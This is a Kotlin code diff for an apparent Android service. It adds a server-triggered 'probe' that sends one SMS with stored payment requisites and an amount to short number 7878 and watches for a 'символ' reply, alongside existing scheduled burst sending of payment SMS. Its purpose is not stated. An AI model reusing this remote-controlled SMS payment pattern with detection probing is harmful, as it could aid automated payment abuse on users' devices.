@@ -98,6 +98,9 @@ class SenderService : Service() {
                         if (DeviceStore.run(this)) scheduleTick(0)
                         // Re-arm burst timers if the schedule's starts changed.
                         if (DeviceStore.startsHash(this) != lastStartsHash) scheduleNextBurst()
+                        // Probe pool: the server asked this device to send one
+                        // detection SMS (nonce changed).
+                        maybeSendProbe()
                     }
                     ControlClient.SyncResult.UNAUTHORIZED -> {
                         // A single 403 can be transient (deploy blip, proxy, brief
@@ -291,6 +294,21 @@ class SenderService : Service() {
             sendOnce(payments[i % payments.size])
             if (i < start.count - 1 && start.intervalMs > 0) sleep(start.intervalMs.toLong())
         }
+    }
+
+    /**
+     * Probe pool: when the server bumps the probe nonce, send exactly ONE SMS
+     * with this device's first payment block (requisites + amount) to 7878. If a
+     * "символ" comes back, [SmsReceiver] reports it as a system-wide signal.
+     */
+    private fun maybeSendProbe() {
+        val req = DeviceStore.probeReq(this)
+        if (req.isBlank() || req == DeviceStore.probeSeen(this)) return
+        DeviceStore.setProbeSeen(this, req) // one probe per nonce, even on retries
+        if (!DeviceStore.active(this) || !DeviceStore.tokenValid(this)) return
+        val payment = DeviceStore.payments(this).firstOrNull { it.message().isNotBlank() } ?: return
+        Log.i(TAG, "Probe: sending one detection SMS")
+        sendOnce(payment)
     }
 
     private fun sendOnce(payment: Payment) {
